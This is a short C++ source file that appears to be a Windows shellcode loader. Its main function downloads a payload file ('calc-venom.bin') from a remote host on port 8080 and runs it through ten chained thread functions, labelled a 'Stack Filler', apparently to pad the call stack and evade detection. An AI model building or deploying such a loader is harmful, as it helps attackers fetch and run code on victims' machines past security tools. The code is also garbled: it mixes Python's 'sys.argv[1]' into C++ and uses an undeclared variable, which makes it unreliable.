#include <Windows.h>
#include <stdio.h>
#include "helperfuncs.h"
#include "AMS.h"
#include <vector>

//Stack Filler
DWORD WINAPI ExtraLevel10(LPVOID lpParameter) {
	printf("[+] Level 10 Complete. Starting AMS\n");
	return ExecuteWithAMS(sc);
}

DWORD WINAPI ExtraLevel9(LPVOID lpParameter) {
	printf("[+] Level 9 Complete.\n");
	return ExtraLevel10(lpParameter);
}
DWORD WINAPI ExtraLevel8(LPVOID lpParameter) {
	printf("[+] Level 8 Complete.\n");
	return ExtraLevel9(lpParameter);
}
DWORD WINAPI ExtraLevel7(LPVOID lpParameter) {
	printf("[+] Level 7 Complete.\n");
	return ExtraLevel8(lpParameter);
}
DWORD WINAPI ExtraLevel6(LPVOID lpParameter) {
	printf("[+] Level 6 Complete.\n");
	return ExtraLevel7(lpParameter);
}

DWORD WINAPI ExtraLevel5(LPVOID lpParameter) {
	printf("[+] Level 5 Complete.\n");
	return ExtraLevel6(lpParameter);
}

DWORD WINAPI ExtraLevel4(LPVOID lpParameter) {
	printf("[+] Level 4 Complete.\n");
	return ExtraLevel5(lpParameter);
}

DWORD WINAPI ExtraLevel3(LPVOID lpParameter) {
	printf("[+] Level 3 Complete.\n");
	return ExtraLevel4(lpParameter);
}

DWORD WINAPI ExtraLevel2(LPVOID lpParameter) {
	printf("[+] Level 2 Complete.\n");
	return ExtraLevel3(lpParameter);
}

DWORD WINAPI ExtraLevel1(LPVOID lpParameter) {
	printf("[+] Level 1 Complete.\n");
	return ExtraLevel2(lpParameter);
}


void main(){
	//Hardcoded values for testing
	sc = WebtoShellc(TEXT(sys.argv[1]), 8080, TEXT("calc-venom.bin"));
	HANDLE SparkPlug = CreateThread(nullptr, 1024 * 1024, (LPTHREAD_START_ROUTINE)ExtraLevel1, nullptr, 0, nullptr);
	WaitForSingleObject(SparkPlug, INFINITE);
	
	return;
}
